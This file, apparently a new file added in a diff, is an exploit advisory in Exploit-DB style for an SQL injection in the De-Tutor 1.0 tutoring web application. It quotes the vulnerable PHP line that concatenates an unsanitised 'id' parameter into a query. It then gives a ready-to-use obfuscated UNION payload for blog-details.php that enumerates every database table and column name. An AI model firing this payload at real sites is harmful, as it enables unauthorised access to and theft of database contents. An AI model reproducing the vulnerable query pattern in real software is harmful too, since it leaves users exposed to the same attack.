@@ -1,0 +1,32 @@
+# # # # #
+# Exploit Title: De-Tutor - Private Tutoring and Admission Processing 1.0 - SQL Injection
+# Dork: N/A
+# Date: 11.08.2017
+# Vendor Homepage : https://sarutech.com/
+# Software Link: https://codecanyon.net/item/detutor-private-tutoring-and-admission-processing/19053430
+# Demo: https://demo.sarutech.com/detutor/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+#
+# Vulnerable Source:
+# .....................
+# $id = $_GET["id"];
+# 
+# $statement = $connection->query("SELECT * FROM post WHERE id='$id'");
+# .....................
+# 	
+# Proof of Concept:
+# http://localhost/[PATH]/blog-details.php?id=[SQL]
+# -1'+/*!22222UnIoN*/(/*!22222SeLeCT*/+0x283129,0x283229,0x3c7370616e3e496873616e2053656e63616e3c2f7370616e3e,(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),/*!11111Concat*/(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x),0x283529,0x283629)--+-
+# 
+# Etc...
+# # # # #
